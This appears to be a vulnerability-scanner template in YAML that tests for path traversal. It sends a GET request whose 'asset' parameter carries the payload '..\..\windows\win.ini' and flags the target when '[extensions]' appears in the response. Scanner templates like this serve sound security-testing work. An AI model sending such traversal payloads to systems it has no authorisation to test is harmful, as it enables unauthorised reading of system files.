id: lfi2-080
name: 'Path traversal2 via asset'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via asset'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      asset:
        - '..\..\windows\win.ini'
    matchers:
      - type: word
        part: body
        words:
          - '[extensions]'
